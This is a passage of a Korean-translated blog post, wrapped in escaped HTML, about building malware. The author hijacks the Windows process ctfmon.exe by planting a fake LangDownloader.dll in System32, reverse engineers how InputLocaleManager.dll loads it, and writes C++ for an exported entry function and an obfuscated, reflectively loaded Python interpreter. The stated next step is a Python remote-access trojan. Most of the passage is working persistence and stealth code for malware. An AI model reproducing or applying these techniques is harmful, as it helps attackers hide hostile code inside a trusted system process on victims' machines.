src=\"/assets/img/2024-06-19-Writemesomemalware_2.png\"\u003e\n\u003cp\u003eLangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-variable constant_\"\u003eBOOL\u003c/span\u003e \u003cspan class=\"hljs-variable constant_\"\u003eAPIENTRY\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDllMain\u003c/span\u003e(\u003cspan class=\"hljs-variable constant_\"\u003eHMODULE\u003c/span\u003e hModule,\n    \u003cspan class=\"hljs-variable constant_\"\u003eDWORD\u003c/span\u003e  ul_reason_for_call,\n    \u003cspan class=\"hljs-variable constant_\"\u003eLPVOID\u003c/span\u003e lpReserved\n)\n{\n    \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (ul_reason_for_call)\n    {\n\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eDLL_PROCESS_ATTACH\u003c/span\u003e:\n        {\n        \u003cspan class=\"hljs-title class_\"\u003eMessageBoxA\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003estd\u003c/span\u003e::\u003cspan class=\"hljs-title function_\"\u003eto_string\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003eGetCurrentProcessId\u003c/span\u003e()).\u003cspan class=\"hljs-title function_\"\u003ec_str\u003c/span\u003e(), \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n        }\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eDLL_THREAD_ATTACH\u003c/span\u003e:\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eDLL_THREAD_DETACH\u003c/span\u003e:\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eDLL_PROCESS_DETACH\u003c/span\u003e:\n        \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-variable constant_\"\u003eTRUE\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(\u003c/p\u003e\n\u003cp\u003eLangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_3.png\" alt=\"이미지\"\u003e\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?\u003c/p\u003e\n\u003cp\u003eProcmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_4.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e해당 문자열을 찾았습니다!\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_5.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e여기서 잘 로드되고 있네요. 이제 뭘 할까요?\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_6.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_7.png\" alt=\"image 1\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_8.png\" alt=\"image 2\"\u003e\u003c/p\u003e\n\u003cp\u003e이 코드를 한 번 분석해 봐요.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e• \u003cspan class=\"hljs-title class_\"\u003eLangDownloader\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003edll\u003c/span\u003e을로드하려고 시도합니다.\n• 실패하는 경우\n  - “종료”로 계속 진행합니다.\n• 성공하는 경우\n  - \u003cspan class=\"hljs-title class_\"\u003eLangDownloaderCreate\u003c/span\u003e의 주소를 가져오려고 시도합니다.\n  - 실패하는 경우\n     프로세스 종료\n  - 성공하는 경우\n     매개변수와 함께 \u003cspan class=\"hljs-title class_\"\u003eLangDownloaderCreate\u003c/span\u003e를 호출합니다\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.\u003c/p\u003e\n\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_9.png\"\u003e\n\u003cp\u003e우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003eextern \u003cspan class=\"hljs-string\"\u003e\"C\"\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003e__declspec\u003c/span\u003e(dllexport) int \u003cspan class=\"hljs-title class_\"\u003eLangDownloaderCreate\u003c/span\u003e(int a, int b)\n{\n    \u003cspan class=\"hljs-comment\"\u003e// 영원히 기다려요\u003c/span\u003e\n    \u003cspan class=\"hljs-variable constant_\"\u003eHANDLE\u003c/span\u003e never_set = \u003cspan class=\"hljs-title class_\"\u003eCreateEventA\u003c/span\u003e(\u003cspan class=\"hljs-variable constant_\"\u003eNULL\u003c/span\u003e, \u003cspan class=\"hljs-variable constant_\"\u003eTRUE\u003c/span\u003e, \u003cspan class=\"hljs-variable constant_\"\u003eFALSE\u003c/span\u003e, \u003cspan class=\"hljs-variable constant_\"\u003eNULL\u003c/span\u003e);\n    \u003cspan class=\"hljs-title class_\"\u003eWaitForSingleObject\u003c/span\u003e(never_set, \u003cspan class=\"hljs-variable constant_\"\u003eINFINITE\u003c/span\u003e);\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e알겠어요!\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_10.png\" alt=\"이미지\"\u003e\u003c/p\u003e\n\u003cp\u003e이제 실행 중이니까... 뭘 하고 싶어요?\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003ch1\u003e무엇을 실행할까요:\u003c/h1\u003e\n\u003cp\u003e제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요\u003c/p\u003e\n\u003cp\u003e배운 바에 의하면, 파이썬은 python\u003ccode\u003e버전\u003c/code\u003e.dll을 사용해서 모든 파이썬 작업을 처리해요\u003c/p\u003e\n\u003cp\u003e이 .dll을 멋지게 C++ 인터페이스로 감싸봐요\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\n{\n\u003cspan class=\"hljs-attr\"\u003epublic\u003c/span\u003e:\n    explicit \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e();\n    ~\u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e();\n\n    \u003cspan class=\"hljs-variable constant_\"\u003eNO_DISCARD\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003evoid\u003c/span\u003e* \u003cspan class=\"hljs-title function_\"\u003erun_line\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estd\u003c/span\u003e::string\u0026#x26; line);\n\n    \u003cspan class=\"hljs-comment\"\u003e// Deleted Functions\u003c/span\u003e\n    \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n    \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\u0026#x26;\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n    \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\u0026#x26; operator=(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n    \u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\u0026#x26; operator=(\u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e\u0026#x26;\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n\n\u003cspan class=\"hljs-attr\"\u003eprivate\u003c/span\u003e:\n    using \u003cspan class=\"hljs-title class_\"\u003ePyObject\u003c/span\u003e = int;\n\n    using \u003cspan class=\"hljs-title class_\"\u003ePyInitializeType\u003c/span\u003e = \u003cspan class=\"hljs-keyword\"\u003evoid\u003c/span\u003e (*)();\n    using \u003cspan class=\"hljs-title class_\"\u003ePyFinalizeType\u003c/span\u003e = \u003cspan class=\"hljs-keyword\"\u003evoid\u003c/span\u003e (*)();\n    using \u003cspan class=\"hljs-title class_\"\u003ePyRunSimpleStringType\u003c/span\u003e = \u003cspan class=\"hljs-title class_\"\u003ePyObject\u003c/span\u003e * (*)(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e char* str);\n\n    \u003cspan class=\"hljs-comment\"\u003e// Members\u003c/span\u003e\n    \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e m_python_interpreter_library;\n    \u003cspan class=\"hljs-title class_\"\u003ePyInitializeType\u003c/span\u003e m_initialize;\n    \u003cspan class=\"hljs-title class_\"\u003ePyFinalizeType\u003c/span\u003e m_finalize;\n    \u003cspan class=\"hljs-title class_\"\u003ePyRunSimpleStringType\u003c/span\u003e m_run_simple_string;\n};\n\n\u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e::\u003cspan class=\"hljs-title class_\"\u003ePythonInterpreter\u003c/span\u003e() :\n    \u003cspan class=\"hljs-title function_\"\u003em_python_interpreter_library\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003eWindowsResource\u003c/span\u003e::\u003cspan class=\"hljs-title function_\"\u003eget_resource\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003eGetModuleHandleA\u003c/span\u003e(\u003cspan class=\"hljs-title function_\"\u003eOBFUSCATE\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"LangDownloader.dll\"\u003c/span\u003e)),\n                                                               \u003cspan class=\"hljs-variable constant_\"\u003eIDR_BINARY1\u003c/span\u003e,\n                                                               \u003cspan class=\"hljs-title function_\"\u003eOBFUSCATE\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Binary\"\u003c/span\u003e))),\n    \u003cspan class=\"hljs-title function_\"\u003em_initialize\u003c/span\u003e(static_cast\u0026#x3C;\u003cspan class=\"hljs-title class_\"\u003ePyInitializeType\u003c/span\u003e\u003e(m_python_interpreter_library.\u003cspan class=\"hljs-title function_\"\u003eget_function\u003c/span\u003e(\u003cspan class=\"hljs-title function_\"\u003eOBFUSCATE\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Py_Initialize\"\u003c/span\u003e)))),\n    \u003cspan class=\"hljs-title function_\"\u003em_finalize\u003c/span\u003e(static_cast\u0026#x3C;\u003cspan class=\"hljs-title class_\"\u003ePyFinalizeType\u003c/span\u003e\u003e(m_python_interpreter_library.\u003cspan class=\"hljs-title function_\"\u003eget_function\u003c/span\u003e(\u003cspan class=\"hljs-title function_\"\u003eOBFUSCATE\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Py_Finalize\"\u003c/span\u003e)))),\n    \u003cspan class=\"hljs-title function_\"\u003em_run_simple_string\u003c/span\u003e(static_cast\u0026#x3C;\u003cspan class=\"hljs-title class_\"\u003ePyRunSimpleStringType\u003c/span\u003e\u003e(m_python_interpreter_library.\u003cspan class=\"hljs-title function_\"\u003eget_function\u003c/span\u003e(\u003cspan class=\"hljs-title function_\"\u003eOBFUSCATE\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"PyRun_SimpleString\"\u003c/span\u003e))))\n{\n    \u003cspan class=\"hljs-title function_\"\u003em_initialize\u003c/span\u003e();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.\u003c/p\u003e\n\u003cp\u003eDynamicLibrary 클래스를 만들어야 합니다.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\n{\n\u003cspan class=\"hljs-attr\"\u003epublic\u003c/span\u003e:\n    explicit \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003eByteSpan\u003c/span\u003e library_binary);\n    ~\u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e();\n\n    \u003cspan class=\"hljs-variable constant_\"\u003eNO_DISCARD\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003evoid\u003c/span\u003e* \u003cspan class=\"hljs-title function_\"\u003eget_function\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003estd\u003c/span\u003e::string\u0026#x26; function_name);\n\n    \u003cspan class=\"hljs-comment\"\u003e// Deleted Functions\u003c/span\u003e\n    \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n    \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\u0026#x26;\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n    \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\u0026#x26; operator=(\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n    \u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\u0026#x26; operator=(\u003cspan class=\"hljs-title class_\"\u003eDynamicLibrary\u003c/span\u003e\u0026#x26;\u0026#x26; other) = \u003cspan class=\"hljs-keyword\"\u003edelete\u003c/span\u003e;\n\n\u003cspan class=\"hljs-attr\"\u003eprivate\u003c/span\u003e:\n    \u003cspan class=\"hljs-variable constant_\"\u003eNO_DISCARD\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003estatic\u003c/span\u003e \u003cspan class=\"hljs-variable constant_\"\u003eHMEMORYMODULE\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eload_library\u003c/span\u003e(\u003cspan class=\"hljs-title class_\"\u003eByteSpan\u003c/span\u003e library_binary);\n\n    \u003cspan class=\"hljs-comment\"\u003e// Members\u003c/span\u003e\n    \u003cspan class=\"hljs-variable constant_\"\u003eHMEMORYMODULE\u003c/span\u003e m_library_base;\n};\n\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_11.png\" alt=\"이미지\"\u003e\u003c/p\u003e\n\u003cp\u003e정말 멋지죠?\u003c/p\u003e\n\u003cp\u003e이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.\u003c/p\u003e\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\u003cp\u003e미안해요! 전손을 올립니다(:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-Writemesomemalware_12.png\" alt=\"Image\"\u003e\u003c/p\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n"},"__N_SSG":true},"page":"/post/[slug]","query":{"slug":"2024-06-19-Writemesomemalware"},"buildId":"CYQjEY3HhSkRTiL0gewc0","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>